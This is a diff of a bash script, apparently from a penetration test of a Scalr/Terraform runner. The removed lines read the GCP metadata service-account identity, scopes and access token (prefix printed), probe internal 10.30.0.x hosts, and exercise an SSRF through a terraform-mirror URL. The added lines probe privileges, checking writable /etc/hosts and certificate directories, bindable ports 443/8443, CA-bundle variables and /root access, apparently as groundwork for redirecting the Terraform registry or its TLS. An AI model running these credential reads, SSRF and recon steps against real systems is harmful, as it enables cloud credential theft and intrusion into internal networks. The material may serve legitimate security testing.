@@ -1,47 +1,54 @@
 #!/usr/bin/env bash
 set -e
 
-echo "=== FINDING 1: GCP Metadata access ==="
-echo "SA identity:"
-curl -sf "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" \
-  -H "Metadata-Flavor: Google"
-echo ""
+echo "=== P1 ENV PROBE ==="
 
-echo "SA scopes:"
-curl -sf "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" \
-  -H "Metadata-Flavor: Google"
-echo ""
+echo "--- identity ---"
+whoami
+id
 
-echo "SA token (prefix only — proves credential access):"
-curl -sf "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
-  -H "Metadata-Flavor: Google" \
-  | python3 -c "
-import sys, json
-t = json.load(sys.stdin)
-print('token_type:', t['token_type'])
-print('expires_in:', t['expires_in'])
-print('access_token[:20]:', t['access_token'][:20] + '...[REDACTED]')
-"
+echo "--- /etc/hosts writable? ---"
+if [ -w /etc/hosts ]; then echo "YES /etc/hosts writable"; else echo "NO /etc/hosts not writable"; fi
 
-echo ""
-echo "=== FINDING 2: Internal network reachability ==="
-echo "API server (10.30.0.120):"
-curl -sf "http://10.30.0.120/api/iacp/v3/accounts" \
-  -o /dev/null -w "HTTP %{http_code}\n" || echo "connection failed"
+echo "--- /etc/ssl/certs writable? ---"
+if [ -w /etc/ssl/certs ]; then echo "YES /etc/ssl/certs writable"; else echo "NO not writable"; fi
 
-echo "Blob server (10.30.0.102):"
-curl -sf "http://10.30.0.102/" \
-  -o /dev/null -w "HTTP %{http_code}\n" || echo "connection failed"
+echo "--- unzip ---"
+which unzip 2>/dev/null && unzip -v 2>/dev/null | head -1 || echo "unzip: NOT FOUND"
 
-echo "Relay server (10.30.0.104):"
-curl -sf "http://10.30.0.104/" \
-  -o /dev/null -w "HTTP %{http_code}\n" || echo "connection failed"
+echo "--- python ---"
+python3 --version 2>&1
 
-echo ""
-echo "=== FINDING 3: C4 mirror SSRF (origin = API server, not agent) ==="
-curl -si "http://internal.main.scalr.dev/terraform-mirror/https://httpbin.org/status/200" \
-  --max-time 8 --no-location \
-  | grep -E "^HTTP/|^Location:"
+echo "--- openssl ---"
+which openssl && openssl version || echo "openssl: not found"
 
-echo ""
-echo "=== done ==="
+echo "--- can bind port 443? ---"
+python3 -c "import socket; s=socket.socket(); s.bind((\"\", 443)); print(\"port 443: bindable\"); s.close()" 2>/dev/null || echo "port 443: cannot bind (non-root)"
+
+echo "--- can bind port 8443? ---"
+python3 -c "import socket; s=socket.socket(); s.bind((\"\", 8443)); print(\"port 8443: bindable\"); s.close()" 2>/dev/null || echo "port 8443: cannot bind"
+
+echo "--- TF env vars ---"
+echo "TF_CLI_CONFIG_FILE=${TF_CLI_CONFIG_FILE}"
+echo "TF_PLUGIN_CACHE_DIR=${TF_PLUGIN_CACHE_DIR}"
+echo "SCALR_HOOK_DIR=${SCALR_HOOK_DIR}"
+echo "HOME=${HOME}"
+echo "USER=${USER}"
+echo "SCALR_HOSTNAME=${SCALR_HOSTNAME}"
+
+echo "--- interesting dirs ---"
+ls /opt/scalr 2>/dev/null && echo "/opt/scalr exists" || echo "no /opt/scalr"
+ls /home 2>/dev/null
+ls /root 2>/dev/null && echo "/root accessible" || echo "/root: no access"
+
+echo "--- REQUESTS_CA_BUNDLE / SSL_CERT_FILE ---"
+echo "REQUESTS_CA_BUNDLE=${REQUESTS_CA_BUNDLE}"
+echo "SSL_CERT_FILE=${SSL_CERT_FILE}"
+echo "CURL_CA_BUNDLE=${CURL_CA_BUNDLE}"
+
+echo "--- network: can reach registry.terraform.io? ---"
+curl -sf -o /dev/null -w "registry.terraform.io HTTP %{http_code}
+" "https://registry.terraform.io/.well-known/terraform.json" --max-time 5 || echo "registry.terraform.io: unreachable"
+
+echo "=== PROBE DONE ==="
+
